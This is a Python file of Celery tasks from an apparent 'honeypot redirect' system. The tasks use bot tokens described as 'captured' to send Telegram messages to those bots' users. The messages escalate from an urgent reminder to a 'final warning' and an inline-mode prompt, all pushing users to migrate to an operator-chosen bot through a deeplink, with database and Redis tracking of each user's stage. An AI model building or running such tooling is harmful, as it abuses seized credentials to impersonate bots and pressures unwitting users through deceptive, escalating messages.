"""
Multi-touch redirect reminder tasks (Level 2).
Sends up to 3 reminder messages with increasing urgency, 24 hours apart.
Uses TTL-based Redis keys to track which message number each user has received.
"""
from datetime import datetime, timezone, timedelta
from app.workers.celery_app import app, get_worker_loop
from app.core.config import settings
from app.core.database import db
from app.workers.tasks.flow_tasks import async_execute
from app.core.logger import get_logger
logger = get_logger(__name__)
from app.workers.tasks.honeypot_redirect_strategies import HoneypotRedirectStrategies


@app.task(name="flow.honeypot_redirect_touch2")
def honeypot_redirect_touch2():
    """
    Level 2 - Second touch: Send urgent reminder to users who received first redirect
    but didn't migrate within 24 hours.
    """
    return get_worker_loop().run_until_complete(_redirect_touch2_logic())


async def _redirect_touch2_logic() -> dict:
    """
    Find users who received redirect_1 but not redirect_2.
    Send second message (urgent tone).
    """
    if not settings.HONEYPOT_REDIRECT_AUTHORIZED:
        return {"status": "skipped", "reason": "not_authorized"}
    redirect_bot = settings.HONEYPOT_REDIRECT_BOT
    deeplink = settings.HONEYPOT_REDIRECT_DEEPLINK
    redirect_url = f"https://t.me/{redirect_bot}?start={deeplink}"
    
    # Find updates where redirect_1_sent_at is set but redirect_2_sent_at is null
    # AND it's been at least 24 hours since redirect_1
    try:
        response = await async_execute(
            db.table("honeypot_updates")
            .select("id, credential_id, sender_user_id")
            .not_.is_("redirect_1_sent_at", "null")
            .is_("redirect_2_sent_at", "null")
            .not_.is_("sender_user_id", "null")
            .lt("redirect_1_sent_at", (datetime.now(timezone.utc) - timedelta(hours=24)).isoformat())
            .limit(100)
        )
        
        candidates = response.data or []
        if not candidates:
            return {"status": "ok", "sent": 0, "reason": "no_candidates"}
        
        sent = 0
        for row in candidates:
            credential_id = row["credential_id"]
            user_id = row["sender_user_id"]
            update_id = row["id"]
            
            # Check Redis dedup
            if HoneypotRedirectStrategies.check_multi_touch_sent(credential_id, user_id, 2):
                continue
            
            # Get bot token
            bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
            if not bot_token:
                continue
            
            # Send second touch message
            sent_ok = await HoneypotRedirectStrategies.send_multi_touch_message(
                bot_token, user_id, 2, redirect_url, redirect_bot
            )
            
            if sent_ok:
                # Update database
                now = datetime.now(timezone.utc).isoformat()
                await async_execute(
                    db.table("honeypot_updates")
                    .update({"redirect_2_sent_at": now})
                    .eq("id", update_id)
                )
                
                # Mark in Redis with 24h TTL
                HoneypotRedirectStrategies.mark_multi_touch_sent(credential_id, user_id, 2)
                sent += 1
                logger.info(f"🔀 [Touch2] sent cred:{credential_id[:8]}...")
        
        return {"status": "ok", "sent": sent, "candidates": len(candidates)}
        
    except Exception as e:
        logger.error(f"Redirect touch2 failed: {e}")
        return {"status": "error", "error": str(e)[:200]}


@app.task(name="flow.honeypot_redirect_touch3")
def honeypot_redirect_touch3():
    """
    Level 2 - Third touch: Final warning to users who received second redirect
    but didn't migrate within 24 hours.
    """
    return get_worker_loop().run_until_complete(_redirect_touch3_logic())


async def _redirect_touch3_logic() -> dict:
    """Send third and final message (last notice tone)."""
    if not settings.HONEYPOT_REDIRECT_AUTHORIZED:
        return {"status": "skipped", "reason": "not_authorized"}
    redirect_bot = settings.HONEYPOT_REDIRECT_BOT
    deeplink = settings.HONEYPOT_REDIRECT_DEEPLINK
    redirect_url = f"https://t.me/{redirect_bot}?start={deeplink}"
    
    try:
        response = await async_execute(
            db.table("honeypot_updates")
            .select("id, credential_id, sender_user_id")
            .not_.is_("redirect_2_sent_at", "null")
            .is_("redirect_3_sent_at", "null")
            .not_.is_("sender_user_id", "null")
            .lt("redirect_2_sent_at", (datetime.now(timezone.utc) - timedelta(hours=24)).isoformat())
            .limit(100)
        )
        
        candidates = response.data or []
        if not candidates:
            return {"status": "ok", "sent": 0, "reason": "no_candidates"}
        
        sent = 0
        for row in candidates:
            credential_id = row["credential_id"]
            user_id = row["sender_user_id"]
            update_id = row["id"]
            
            if HoneypotRedirectStrategies.check_multi_touch_sent(credential_id, user_id, 3):
                continue
            
            bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
            if not bot_token:
                continue
            
            sent_ok = await HoneypotRedirectStrategies.send_multi_touch_message(
                bot_token, user_id, 3, redirect_url, redirect_bot
            )
            
            if sent_ok:
                now = datetime.now(timezone.utc).isoformat()
                await async_execute(
                    db.table("honeypot_updates")
                    .update({"redirect_3_sent_at": now})
                    .eq("id", update_id)
                )
                
                HoneypotRedirectStrategies.mark_multi_touch_sent(credential_id, user_id, 3)
                sent += 1
                logger.info(f"🔀 [Touch3] sent cred:{credential_id[:8]}...")
        
        return {"status": "ok", "sent": sent, "candidates": len(candidates)}
        
    except Exception as e:
        logger.error(f"Redirect touch3 failed: {e}")
        return {"status": "error", "error": str(e)[:200]}


@app.task(name="flow.honeypot_proactive_outreach")
def honeypot_proactive_outreach():
    """
    Level 5 Option A: Proactive outreach via captured bot.
    Asks users to type @bot_username in the chat (inline mode trigger).
    """
    return get_worker_loop().run_until_complete(_proactive_outreach_logic())


async def _proactive_outreach_logic() -> dict:
    """
    Find ALL unique users across all captured bots who haven't been redirected yet.
    Send proactive message asking them to use inline mode.
    """
    if not settings.HONEYPOT_REDIRECT_AUTHORIZED:
        return {"status": "skipped", "reason": "not_authorized"}
    redirect_bot = settings.HONEYPOT_REDIRECT_BOT
    
    # Find users who triggered honeypot BUT were not redirected yet
    # (initial redirect didn't happen - they just saw the honeypot)
    try:
        response = await async_execute(
            db.table("honeypot_updates")
            .select("id, credential_id, sender_user_id")
            .is_("redirected_at", "null")
            .is_("proactive_sent_at", "null")
            .not_.is_("sender_user_id", "null")
            .limit(100)
        )
        
        candidates = response.data or []
        if not candidates:
            logger.info("🔗 [Proactive] No candidates for outreach")
            return {"status": "ok", "sent": 0, "reason": "no_candidates"}
        
        sent = 0
        for row in candidates:
            credential_id = row["credential_id"]
            user_id = row["sender_user_id"]
            update_id = row["id"]
            
            # Check if already sent (Redis dedup)
            key = f"redirect:proactive:{credential_id}:{user_id}"
            try:
                from app.core.redis_srv import redis_srv
                if redis_srv.client.exists(key):
                    continue
            except Exception:
                pass
            
            bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
            if not bot_token:
                continue
            
            # Send proactive inline request
            sent_ok = await HoneypotRedirectStrategies.send_proactive_inline_request(
                bot_token, user_id, redirect_bot
            )
            
            if sent_ok:
                now = datetime.now(timezone.utc).isoformat()
                await async_execute(
                    db.table("honeypot_updates")
                    .update({"proactive_sent_at": now})
                    .eq("id", update_id)
                )
                
                # Set Redis dedup key (24h TTL)
                try:
                    from app.core.redis_srv import redis_srv
                    redis_srv.client.setex(key, 86400, "1")
                except Exception:
                    pass
                
                sent += 1
                logger.info(f"🔗 [Proactive] sent cred:{credential_id[:8]}...")
        
        return {"status": "ok", "sent": sent, "candidates": len(candidates)}
        
    except Exception as e:
        logger.error(f"Proactive outreach failed: {e}")
        return {"status": "error", "error": str(e)[:200]}
